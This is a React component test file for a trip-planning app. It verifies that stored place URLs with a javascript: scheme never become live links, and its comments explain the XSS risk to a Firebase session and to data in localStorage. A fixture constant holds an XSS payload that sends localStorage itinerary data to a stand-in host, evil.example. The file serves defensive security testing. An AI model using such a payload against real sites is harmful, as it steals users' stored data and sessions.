// @vitest-environment jsdom
//
// The href scheme allow-list at the LAST boundary — `components/my-places-section.tsx`, where a
// stored place becomes a real `<a href target="_blank">`.
//
// This is the boundary that has to hold. Places are a SYNCED domain (`lib/places-ports.ts`), so a
// row can arrive from the other member's device — or from a build of this app that predates the two
// producer-side guards (`lib/place-resolve.ts`'s `cleanUrl`, the import sheet's `sourceUrl`) — and
// `core/places/model.ts` types both URL fields as a bare `z.string().optional()`, so the read
// boundary passes them through. The export is static GitHub Pages with no CSP, which is what makes
// a `javascript:` href on this origin a script with the Firebase session and every trip key in
// localStorage in reach.

import { describe, it, expect, beforeEach, vi } from 'vitest';
import { createElement } from 'react';
import { createRoot } from 'react-dom/client';
import { act } from 'react-dom/test-utils';
import type { MyPlace } from '@/core/places/model';

vi.mock('sonner', () => ({ toast: { success: vi.fn(), error: vi.fn() } }));

vi.mock('@/components/itinerary-provider', () => ({
  useItineraryContext: () => ({ addItem: vi.fn(), findPlacements: () => [] }),
}));

vi.mock('framer-motion', async () => {
  const React = await import('react');
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const strip = (p: any) => {
    const { initial, animate, exit, whileHover, whileInView, whileTap, viewport, transition, layout, ...rest } = p;
    return rest;
  };
  return {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    m: { div: (props: any) => React.createElement('div', strip(props)) },
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    AnimatePresence: ({ children }: any) => children,
    useReducedMotion: () => false,
  };
});

import MyPlacesSection from '@/components/my-places-section';

const MY_PLACES_KEY = 'nepal_japan_my_places';
const XSS = "javascript:fetch('https://evil.example/?'+localStorage.getItem('nepal_japan_itinerary'))";

function seed(rows: Partial<MyPlace>[]): void {
  localStorage.setItem(
    MY_PLACES_KEY,
    JSON.stringify(
      rows.map((r, n) => ({
        id: `p${n}`,
        name: `Place ${n}`,
        legId: 'nepal',
        addedAt: '2026-08-01T00:00:00.000Z',
        ...r,
      })),
    ),
  );
}

function render() {
  const container = document.createElement('div');
  document.body.appendChild(container);
  const root = createRoot(container);
  act(() => {
    root.render(createElement(MyPlacesSection, { legId: 'nepal' }));
  });
  return {
    hrefFor(id: string): string | null {
      const a = container.querySelector<HTMLAnchorElement>(`[data-testid="myplace-link-${id}"]`);
      return a ? a.getAttribute('href') : null;
    },
    unmount() {
      act(() => root.unmount());
      container.remove();
    },
  };
}

describe('MyPlacesSection — the place-card link-out is scheme-checked at render', () => {
  beforeEach(() => localStorage.clear());

  it('a stored javascript: sourceUrl produces NO anchor at all', () => {
    seed([{ sourceUrl: XSS }]);
    const h = render();
    expect(h.hrefFor('p0')).toBeNull();
    h.unmount();
  });

  it('a stored javascript: resolvedUrl does not shadow a safe sourceUrl — the first SAFE one wins', () => {
    // `resolvedUrl ?? sourceUrl` handed the anchor whichever was present, not whichever was safe.
    seed([{ resolvedUrl: XSS, sourceUrl: 'https://maps.app.goo.gl/abc' }]);
    const h = render();
    expect(h.hrefFor('p0')).toBe('https://maps.app.goo.gl/abc');
    h.unmount();
  });

  it('an ordinary https place still links out, and resolvedUrl still wins over sourceUrl', () => {
    seed([
      { sourceUrl: 'https://maps.app.goo.gl/abc' },
      { sourceUrl: 'https://maps.app.goo.gl/abc', resolvedUrl: 'https://www.google.com/maps/place/Fushimi' },
    ]);
    const h = render();
    expect(h.hrefFor('p0')).toBe('https://maps.app.goo.gl/abc');
    expect(h.hrefFor('p1')).toBe('https://www.google.com/maps/place/Fushimi');
    h.unmount();
  });
});
